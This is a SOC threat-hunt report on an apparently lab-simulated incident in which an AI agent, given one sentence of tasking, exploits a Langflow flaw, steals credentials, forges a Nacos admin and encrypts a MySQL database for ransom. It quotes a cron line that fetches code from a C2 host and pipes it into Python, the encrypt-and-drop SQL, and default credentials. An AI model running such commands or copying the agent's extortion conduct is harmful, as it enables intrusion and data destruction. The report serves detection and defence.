<p align="center"><img src="images/00-pacificwatch-banner.png" alt="PacificWatch SOC" width="600"></p>

# Threat Hunt Report — Hunt 23: JADEPUFFER

*Agentic Ransomware // Flowforge Estate*

| | |
|---|---|
| **Analyst** | Jenna Frank, Security Operations Manager |
| **Organization** | PacificWatch SOC // Log(N) Pacific Cyber Range |
| **Hunt Date** | 2026-07-30 // 19:20–19:37 UTC |
| **Report Date** | 2026-09-13 |
| **Severity** | 🔴 **HIGH** |
| **Classification** | Agentic Ransomware / Confirmed Incident |

*PacificWatch SOC // LAW-HuntPractice Workspace // Hunt 23 JADEPUFFER*

> [!NOTE]
> This hunt was performed in the Log(N) Pacific cyber range. Hosts, IPs, accounts, and indicators come from lab telemetry and are shared for education and detection engineering.

## Contents

1. [Executive Summary](#01-executive-summary)
2. [Environment Overview](#02-environment-overview)
3. [Attack Timeline](#03-attack-timeline)
4. [Initial Access: The Front Door Was Unlocked](#04-initial-access-the-front-door-was-unlocked)
5. [Command & Control: Keeping the Door Open](#05-command--control-keeping-the-door-open)
6. [Credential Access: The Keys to Everything](#06-credential-access-the-keys-to-everything)
7. [Discovery & Lateral Movement: Meet the Neighbors](#07-discovery--lateral-movement-meet-the-neighbors)
8. [Privilege Escalation: A Key That Never Changed](#08-privilege-escalation-a-key-that-never-changed)
9. [Impact: The Ransom Note](#09-impact-the-ransom-note)
10. [Autonomy Analysis: Was a Human Doing This?](#10-autonomy-analysis-was-a-human-doing-this)
11. [Real or Noise: Separating the Attack from the Floor](#11-real-or-noise-separating-the-attack-from-the-floor)
12. [Indicators of Compromise](#12-indicators-of-compromise)
13. [Recommendations](#13-recommendations)
- [Appendix A: KQL Queries Used](#appendix-a-kql-queries-used)

---

## 01 Executive Summary

On July 30, 2026, Flowforge, a company that builds AI workflow tooling, was hit by an attack I hadn't seen before. An analytics rule tripped at 19:21 UTC when a service account launched a process it had never run. Seventeen minutes later a production database was encrypted, a ransom note was planted, and the original tables were dropped. Start to finish, no human ever touched the keyboard. The only human input was a single sentence of instruction at the very beginning.

> [!IMPORTANT]
> **🤖 What made this different:** This wasn't a person typing commands. It was an AI agent that took one sentence of instruction and worked out the rest on its own. In 17 minutes it exploited a known vulnerability, stole credentials, mapped the internal network, forged an admin account, encrypted 1,342 database records, and wrote its own ransom note.

Sysdig's research team named the actor JADEPUFFER. As far as I can tell, it's the first publicly documented case of end-to-end agentic ransomware. Normal ransomware has a person at the keyboard, or at least a person who wrote the script. JADEPUFFER had neither. An LLM agent took one tasking instruction and ran the whole extortion operation itself, making its own calls when something broke and fixing it within seconds.

This report documents how that attack unfolded, what evidence I found in the telemetry, and what it means for defenders.

| ⏱️ **17 min** | 🖥️ **4** | 🔒 **1,342** | 🔑 **8** |
|:---:|:---:|:---:|:---:|
| Total attack duration | Hosts compromised | Records encrypted | Credential families stolen |

## 02 Environment Overview

Flowforge runs a small Linux estate: four servers on a private subnet (10.4.0.0/24). Think of it as four rooms in an office. They can all talk to each other internally, and one of them has a front door facing the internet.

| Host | IP | Role |
|---|---|---|
| ff-lf-01 | 10.4.0.10 | Entry point. Langflow AI workflow server, internet-facing |
| ff-minio-01 | 10.4.0.20 | MinIO object storage (like a self-hosted S3 bucket) |
| ff-db-01 | 10.4.0.30 | MySQL production database (the target) |
| ff-nacos-01 | 10.4.0.40 | Nacos service configuration platform |

> [!TIP]
> **Normal traffic rule:** ff-lf-01 initiates all internal connections. The other three hosts do not talk to each other directly. Any host-to-host traffic that does not match this pattern is worth investigating.

![Flowforge estate network diagram](images/01-flowforge-estate.png)

*The Flowforge estate at the time of the attack. ff-lf-01 (top left, marked ALERT) was the only host with internet exposure. All three internal services were reachable from it, which is exactly what the agent used to move laterally.*

## 03 Attack Timeline

Here is the full 17-minute chain, reconstructed from telemetry. Every row below is evidence, not theory.

| Time (UTC) | Host | Event | MITRE |
|---|---|---|---|
| **19:20:00** | ff-lf-01 | RCE exploit delivered to `/api/v1/validate/code`; HTTP 200 returned | T1190 |
| **19:20:04** | ff-lf-01 | python3.11 spawned by Langflow web service; attacker has code execution | T1059.006 |
| **19:20:05** | ff-lf-01 | Agent runs `id`, `uname` to confirm who it is and what OS it landed on | T1082 |
| **19:22:04** | ff-lf-01 | Outbound beacon established to 45.131.66.106:4444; C2 channel open | T1071.001 |
| **19:25:04** | ff-lf-01 | Dumps Langflow Postgres DB; `variable` and `api_key` tables targeted | T1552 |
| **19:25:13** | ff-lf-01 | 8 credential families harvested (LLM providers, cloud, DB, crypto wallets) | T1552 |
| **19:27:28** | ff-lf-01 | Subnet sweep of 10.4.0.0/24; finds MinIO, MySQL, Nacos in 8 seconds | T1046 |
| **19:27:39** | ff-minio-01 | Default MinIO creds (`minioadmin:minioadmin`) accepted; no exploit needed | T1078 |
| **19:30:35** | ff-minio-01 | `credentials.json` retrieved from terraform-state bucket | T1005 |
| **19:33:39** | ff-nacos-01 | Default JWT signing key used to forge admin token; Nacos targeted | T1550 |
| **19:34:36** | ff-nacos-01 | First admin-create attempt fails: blank password hash, 403 returned | T1078.001 |
| **19:35:07** | ff-nacos-01 | 31 seconds later: corrective payload, account `svc_maint` created successfully | T1078.001 |
| **19:35:32** | ff-lf-01 | Docker socket probed via curl; container escape check | T1611 |
| **19:35:51** | ff-lf-01 | Cron entry installed; beacons to C2 every 30 min as langflow account | T1053.003 |
| **19:36:30** | ff-db-01 | 1,342 records encrypted with `AES_ENCRYPT` in `config_info` table | T1486 |
| **19:36:37** | ff-db-01 | `DROP TABLE config_info`; originals destroyed | T1485 |
| **19:36:38** | ff-db-01 | `DROP TABLE history`; history purged | T1485 |
| **19:37:00** | ff-db-01 | `README_RANSOM` table created; ransom note planted, key never persisted | T1486 |

<p align="center"><img src="images/02-alert-queue.png" alt="SOC alert queue showing seven detections" width="320"></p>

*Seven alerts fired across four hosts in a 17-minute window; six are HIGH severity. The attack moved from ff-lf-01 (entry) to ff-minio-01 (credential theft) to ff-nacos-01 (privilege escalation) to ff-db-01 (encryption and destruction), all in sequence and all automated.*

## 04 Initial Access: The Front Door Was Unlocked

### What happened

Langflow is a platform for building AI workflows, and it includes a code editor that lets users write Python to connect different AI services. That editor has a backend endpoint, `/api/v1/validate/code`, that checks whether code is valid before running it. The problem is that the endpoint would run whatever Python you sent it, with no authentication in front of it. Anyone on the internet could reach it.

CVE-2025-3248 is the formal name for this vulnerability. A patch existed and CISA had flagged it as mandatory to fix. Flowforge hadn't patched.

### What the telemetry showed

> **Finding:** POST to `/api/v1/validate/code` at 19:20:00 UTC. HTTP 200 returned. Source IP 64.20.53.230, user agent `python-requests/2.32.3`.

```kql
Syslog | where RunId_CF == "jp-46-20260730"
| where ProcessName == "langflow" and SyslogMessage has "validate/code"
| project TimeGenerated, SyslogMessage
```

```text
→ POST /api/v1/validate/code HTTP/1.1 200 host=langflow.flowforge.io
  src=64.20.53.230 ua="python-requests/2.32.3"
```

![Syslog query showing the exploit POST](images/03-initial-access-syslog.png)

Four seconds later, the Langflow service process spawned a python3.11 interpreter running a base64-encoded payload: the attacker's code, now executing on the server. The agent immediately ran `id` and `uname` to check who it was running as and what it had landed on.

> [!TIP]
> **Why this matters:** The exploit path is the most stable thing to detect on. An attacker can change IP, payload, and tooling, but not the endpoint Langflow uses for code validation. A single WAF rule blocking external POST requests to `/api/v1/validate/code` would have stopped this before it started.

### The agent named itself

One useful quirk of this attack is that the agent narrated what it was doing in its own logs. When I queried the `LLMAgentLogs_CL` table, the attacker's reasoning was sitting there in plain English:

> *"Target Langflow instance exposed on 7860. The /api/v1/validate/code endpoint accepts unauthenticated code validation. I will abuse Python default-argument evaluation (CVE-2025-3248)"*
>
> — jadepuffer-agent, 19:20:01 UTC

![LLMAgentLogs_CL model_response naming CVE-2025-3248](images/04-agent-cve-reasoning.png)

*LLMAgentLogs_CL. The attacker's own `model_response` field, naming CVE-2025-3248 and describing its exploitation plan in plain English. The agent narrated its own attack.*

## 05 Command & Control: Keeping the Door Open

### What happened

Getting into a system is one thing. Staying in is another. The agent did two things to make sure it could keep coming back: it immediately opened a reverse shell connection to its own server, and it installed a scheduled task (a cron job) to reconnect every 30 minutes even if the connection dropped.

### The beacon

> **Finding:** 45.131.66.106 on port 4444, confirmed from `LinuxNetwork_CL`, outbound from ff-lf-01 at 19:22:04 UTC.

Port 4444 is what gives it away. Every other outbound connection from ff-lf-01 used port 443 (standard HTTPS): GitHub, npm, HuggingFace. The C2 was the only one on a non-standard high port, which is exactly how a detection rule should catch it.

![LinuxNetwork_CL showing the port 4444 beacon](images/05-c2-beacon.png)

*LinuxNetwork_CL. One external connection on a non-standard port; everything else ff-lf-01 talked to used port 443. This single row is the C2 beacon, established two minutes after the exploit landed.*

### The persistence mechanism

> **Finding:** Cron entry installed under the langflow service account: `curl -s http://45.131.66.106:4444/b | python3 -`, firing every 30 minutes.

```kql
LinuxSystem_CL | where RunId == "jp-46-20260730"
| where Facility == "cron" and EventOriginalMessage has "45.131.66"
| project TimeGenerated, Computer, EventOriginalMessage
```

```text
→ (langflow) CMD (curl -s http://45.131.66.106:4444/b | python3 -)
```

The cron job isn't just a heartbeat; it's a live execution channel. Every 30 minutes it pulls a script from the C2 and pipes it straight into Python, so the attacker can push whatever code they want on each check-in. Even if Flowforge had found and killed the initial connection, the cron job would have brought it back at the next tick.

> [!TIP]
> **Why this matters:** Incident response isn't just "kill the process." If you don't find and remove the cron entry, the threat comes back on a schedule. Check cron tables on every compromised host before you declare containment.

## 06 Credential Access: The Keys to Everything

### What happened

Because Langflow is an AI workflow platform, it's full of API keys: credentials for OpenAI, Anthropic, cloud providers, and databases. The agent knew exactly where to look. It used `pg_dump` to pull only the tables holding credentials, then classified everything it found in a single pass.

### The targeted dump

A legitimate nightly backup happened to be running around the same time, which is the detail that separates the attacker's activity from routine operations:

| Nightly backup | Attacker dump |
|---|---|
| User: `backup` | User: `langflow` |
| Full database dump | Tables: `variable`, `api_key` only |
| Output: `/backup/nightly/` | No output file; in-memory only |
| Time: 19:27:04 | Time: 19:25:07 |

![LinuxProcess_CL showing the targeted pg_dump](images/06-pg-dump-lineage.png)

*LinuxProcess_CL showing both database dumps within two minutes of each other. Same tool, different user, different scope. That difference is the whole line between the backup job and the attack.*

### What it walked away with

The agent classified everything it stole in a single `model_response` entry. That's a behavioral fingerprint of an autonomous agent: a human would spread this over hours, but the agent did it in one tool call:

> *"Harvested keys span OpenAI, Anthropic, DeepSeek, Gemini for LLM providers, and Alibaba, Aliyun, Tencent, Huawei for cloud. Also database logins and crypto wallets. Prioritising cloud and database creds for lateral movement."*
>
> — jadepuffer-agent, 19:25:13 UTC

> **8 named providers across two categories:** 4 LLM providers (OpenAI, Anthropic, DeepSeek, Gemini) and 4 cloud providers (Alibaba, Aliyun, Tencent, Huawei), plus database logins and crypto wallets. All classified in a single automated pass.

## 07 Discovery & Lateral Movement: Meet the Neighbors

### The subnet sweep

With credentials in hand, the agent swept the entire internal network, all 256 addresses in the 10.4.0.0/24 range. It found all three internal services in under ten seconds. The sweep ran as process ID 4491, which I traced from `LinuxProcess_CL` into `LinuxNetwork_CL`:

```kql
LinuxNetwork_CL | where RunId == "jp-46-20260730"
| where DvcHostname == "ff-lf-01" and ActingProcessId == "4491"
| project EventStartTime, DstIpAddr, DstPortNumber | sort by EventStartTime asc
```

```text
→ 19:27:31  10.4.0.20:9000  (MinIO)
→ 19:27:33  10.4.0.30:3306  (MySQL)
→ 19:27:36  10.4.0.40:8848  (Nacos)
```

![LinuxNetwork_CL PID pivot showing the subnet sweep](images/07-subnet-sweep.png)

### MinIO: default credentials accepted

MinIO is a self-hosted object storage service. It ships with default credentials (`minioadmin:minioadmin`) that most people forget to change. The agent tried them, they worked, and no exploit was needed.

It then enumerated every bucket, found the terraform-state bucket, and pulled `credentials.json` out of it. Terraform is what many teams use to build and manage cloud infrastructure, so that one file held credentials for a lot more than MinIO.

### The self-correcting MinIO fetch

> **Finding:** MinIO returned XML instead of JSON. The agent diagnosed the schema mismatch and re-issued the request with a corrected parser, all within the same automated step.

This is one of the clearest signs an agent was driving. It expected JSON, got XML (MinIO uses the S3 XML response schema), worked out the problem in its own reasoning log, and retried with a corrected parser, with no human in the loop. A person would have stopped to check the API docs first.

![LLMAgentLogs_CL showing the MinIO tool calls](images/08-minio-self-correction.png)

*LLMAgentLogs_CL. Two tool calls tell the whole MinIO story: default credentials accepted on the first try, then the agent hit unexpected XML, fixed its parser, and pulled `credentials.json` from the terraform-state bucket on the retry. No human involved.*

## 08 Privilege Escalation: A Key That Never Changed

### The Nacos default signing key

Nacos is Alibaba's service configuration platform. It's the system that tells all the other services how to talk to each other. Whoever controls Nacos controls the whole estate's configuration.

Nacos uses JWT authentication; it issues tokens that prove who you are. The problem is that since 2020 it has shipped with the same default signing key, documented right in its own source code. If you know the key, you can forge a token that says you're an admin. The agent knew the key.

### The failed attempt, and the 31-second fix

This is the sequence that stuck with me. The agent's first attempt to create a backdoor admin account failed: it submitted a blank password hash because the bcrypt generation subprocess didn't have the right PATH. It diagnosed the failure in 12 seconds, issued a corrective payload 19 seconds after that, and had a working admin account within 31 seconds of the original error.

| Time | What happened |
|---|---|
| 19:34:36 | First attempt: blank password hash submitted, 403 returned |
| 19:34:48 | Agent diagnoses failure and generates corrected payload simultaneously |
| 19:35:07 | Corrective payload: bcrypt imported directly, `svc_maint` account created |
| 19:35:18 | Login successful; Nacos and backing MySQL now under attacker control |

> [!IMPORTANT]
> **The 31-second window:** A person reading an error, working out the root cause (a subprocess PATH issue), writing a corrective script, and submitting it takes a lot longer than 31 seconds. The 15-line corrective payload (delete, diagnose, rebuild, reinsert) arrived faster than anyone could type it. That's machine-speed self-correction.

![LinuxAudit_CL ADD_USER event for svc_maint](images/09-nacos-backdoor-audit.png)

*LinuxAudit_CL. The backdoor account creation, logged by the Linux audit subsystem. 31 seconds after the first failed attempt, `svc_maint` was created successfully under the nacos process. The name is chosen to look like a legitimate service account.*

## 09 Impact: The Ransom Note

### What happened to the data

With admin access to Nacos and its backing MySQL database, the agent encrypted all 1,342 service configuration records using MySQL's built-in `AES_ENCRYPT()` function, dropped the original tables, and created a ransom note in their place.

> **Finding:** `AES_ENCRYPT` applied to 1,342 rows in `config_info`, then `DROP TABLE config_info` and `DROP TABLE history`, then `README_RANSOM` created.

```sql
19:36:30  UPDATE config_info SET content=AES_ENCRYPT(content,@k)  /* 1342 rows affected */
19:36:37  DROP TABLE config_info
19:36:38  DROP TABLE history
```

![Syslog on ff-db-01 showing encryption and table drops](images/10-db-encrypt-drop.png)

*Syslog on ff-db-01. Three events tell the complete destruction sequence: 1,342 rows encrypted at 19:36:30, original table dropped at 19:36:37, history purged at 19:36:38. The ransom note table was created seconds later. The whole thing took under 90 seconds.*

### The ransom note

The agent created a table called `README_RANSOM` containing the demand. It claimed AES-256 encryption (MySQL defaults to AES-128-ECB, so this is likely an overstatement), listed a Bitcoin address, and provided a Proton Mail contact.

| | |
|---|---|
| **Ransom table** | `README_RANSOM` |
| **Contact** | `e78393397@proton.me` |
| **Bitcoin address** | `3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy` |

> [!CAUTION]
> **Critical finding, data is unrecoverable:** The AES key was generated as `base64(uuid4().bytes + uuid4().bytes)`, effectively random, printed to stdout once, and never stored or transmitted. Even if Flowforge paid, there is no key to send back. No recoverable encryption key was found in the available telemetry, so without an external copy of that key or a viable backup, recovery is very unlikely.

## 10 Autonomy Analysis: Was a Human Doing This?

### The verdict: human-tasked

This was not fully human-driven (no human was at the keyboard), and it was not purely autonomous (something set it going). It was human-tasked: one person wrote one sentence, and an AI agent did everything else.

```text
Session:    jp-7f3c9a21
User input: "Gain access to the Flowforge estate, locate and encrypt
             the most business-critical datastore, and leave payment instructions."
```

That is the entire human contribution to this attack: one sentence. The agent interpreted it, planned the operation, executed it, adapted when things broke, and left a ransom note, all on its own.

### Four signatures of autonomous execution

- **Self-narrating code:** every payload carried natural-language comments explaining why each action was taken. People don't annotate throwaway one-liners like that; LLMs do it reflexively.
- **Machine-speed self-correction:** the Nacos failure-to-fix window was 31 seconds for a 15-line corrective payload, which fits automated execution far better than a person working by hand.
- **Parallel hypothesis testing:** when the first Nacos attempt failed, the agent tested default credentials and generated a corrected hash at the same time, chasing two failure hypotheses in parallel.
- **Compressed execution:** the entire kill chain from initial access to ransom note took 17 minutes, with no human-paced pauses between steps.

![LLMAgentLogs_CL showing the single human tasking instruction](images/11-human-tasking.png)

*LLMAgentLogs_CL. The entire human contribution to this attack, one sentence. Session jp-7f3c9a21 received this instruction and executed a complete ransomware operation on its own. Everything else in this report came from that single line.*

### The unanswerable question

> [!WARNING]
> **Telemetry gap:** The Docker socket probe at 19:35:32 was logged as a request (`GET /containers/json` via `/var/run/docker.sock`), but the response was not captured. `LinuxContainer_CL` logs requests only; container IDs and image names are not populated. Which containers the agent actually saw cannot be established from the available telemetry.

## 11 Real or Noise: Separating the Attack from the Floor

An AI estate has a lot of python3.11 processes running. Not every one is an attacker. Here is how I separated the malicious activity from legitimate operations:

### Python3.11 spawns: check the parent process

Several python3.11 processes ran on ff-lf-01 during the hunt window: developer one-liners, Langflow flow workers, and the attacker's two interpreters. The binary name is identical across all three use cases. Only one field separates them:

> **Finding:** `ActingProcessName = python3.11`. The attacker's processes were spawned by the Langflow web process (itself python3.11), while legitimate spawns have bash or systemd as the parent.

### External addresses: check the port

ff-lf-01 connected to several external addresses: api.github.com, registry.npmjs.org, a HuggingFace endpoint. All legitimate traffic used port 443. The C2 was the only external connection on a non-standard port:

> **Finding:** `DstPortNumber = 4444`. The only external connection not on port 443, and no legitimate service in this environment runs on that port.

### Timing: check for compression

Legitimate python3.11 activity is spread across normal working hours, intermittent, with natural pauses. The attacker's activity is one dense cluster with no gaps:

> **Finding:** Compressed, continuous execution: 17 minutes from initial access to ransom note with no human-paced pauses. Execution without gaps is the temporal signature of an automated chain.

## 12 Indicators of Compromise

| Indicator | Value |
|---|---|
| **C2 / Payload Host IP** | `45.131.66.106` |
| **Initial Access Source IP** | `64.20.53.230` |
| **C2 port** | `4444` |
| **Exploit endpoint** | `/api/v1/validate/code` |
| **CVE** | CVE-2025-3248 (Langflow unauthenticated RCE) |
| **Backdoor account** | `svc_maint` (on ff-nacos-01) |
| **Persistence** | cron, `*/30 * * * *`, langflow account |
| **Cron command** | `curl -s http://45.131.66.106:4444/b \| python3 -` |
| **Ransom table** | `README_RANSOM` |
| **Ransom contact** | `e78393397@proton.me` |
| **Bitcoin address** | `3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy` |
| **Agent actor ID** | `jadepuffer-agent` |
| **Session ID** | `jp-7f3c9a21` |

## 13 Recommendations

### Immediate: patch and revoke

- Patch Langflow to a release that fixes CVE-2025-3248. Do not expose the `/api/v1/validate/code` endpoint to the internet under any circumstances.
- Revoke all credentials stored in Langflow's database: LLM API keys, cloud credentials, everything. Assume they are compromised.
- Remove the `svc_maint` account from ff-nacos-01 and audit all accounts created since 2026-07-30.
- Remove the cron entry from ff-lf-01 and check all hosts for similar beacon entries.

### Short term: harden defaults

- Change the Nacos default JWT signing key immediately. Never ship the documented default value.
- Change MinIO credentials from `minioadmin:minioadmin`. A rotation needs change-control sign-off, but the command itself is straightforward, so prioritize it.
- Never expose database admin ports (3306) or configuration services (Nacos 8848) to the internet.
- Do not store LLM provider keys or cloud credentials in the Langflow environment; use a secrets manager.

### Long term: defense in depth

- Apply egress controls so compromised application hosts cannot beacon to arbitrary external destinations.
- Monitor `LLMAgentLogs_CL` for agent sessions with unusual actors or `user_input` patterns; the attacker's reasoning is logged and readable.
- Treat AI-workflow servers as high-value targets: they are credential stores by design, and they are frequently stood up without network controls.
- Implement runtime detection on database processes; mass `AES_ENCRYPT` followed by `DROP TABLE` is detectable in near real time.

> [!IMPORTANT]
> **The key lesson:** None of the individual techniques were novel. An unpatched CVE, unchanged default credentials, an exposed database port, a known JWT signing key. What was new was an AI agent stringing all of them together in 17 minutes without a human involved. The skill floor for running ransomware has dropped to whatever it costs to run an agent.

---

## Appendix A: KQL Queries Used

### Initial access: exploit request

```kql
Syslog
| where RunId_CF == "jp-46-20260730"
| where Computer == "ff-lf-01"
| project TimeGenerated, SyslogMessage
```

### Agent reasoning: jadepuffer sessions

```kql
LLMAgentLogs_CL
| where RunId == "jp-46-20260730"
| where actor == "jadepuffer-agent"
| project TimeGenerated, session_id, user_input, model_response
| sort by TimeGenerated asc
```

### Process lineage: spawned interpreters

```kql
LinuxProcess_CL
| where RunId == "jp-46-20260730"
| where DvcHostname == "ff-lf-01"
| where TargetProcessName == "python3.11" or ActingProcessName == "python3.11"
| project EventStartTime, TargetProcessName, TargetProcessCommandLine,
          ActingProcessName, ActingProcessCommandLine
| sort by EventStartTime asc
```

### Network sweep: PID pivot

```kql
LinuxNetwork_CL
| where RunId == "jp-46-20260730"
| where DvcHostname == "ff-lf-01" and ActingProcessId == "4491"
| project EventStartTime, DstIpAddr, DstPortNumber
| sort by EventStartTime asc
```

### Persistence: cron beacon

```kql
LinuxSystem_CL
| where RunId == "jp-46-20260730"
| where Facility == "cron" and EventOriginalMessage has "45.131.66"
| project TimeGenerated, Computer, EventOriginalMessage
```

### Impact: encryption and destruction

```kql
Syslog
| where RunId_CF == "jp-46-20260730"
| where Computer == "ff-db-01"
| where SyslogMessage has "AES_ENCRYPT" or SyslogMessage has "DROP TABLE"
    or SyslogMessage has "README_RANSOM"
| project TimeGenerated, SyslogMessage
| sort by TimeGenerated asc
```

### Triage: separating attacker from developer python3.11

```kql
LinuxProcess_CL
| where RunId == "jp-46-20260730"
| where DvcHostname == "ff-lf-01" and TargetProcessName == "python3.11"
| summarize count() by ActingProcessName
```

---

*PacificWatch SOC // Hunt 23 JADEPUFFER // Analyst: Jenna Frank // 2026-09-13*
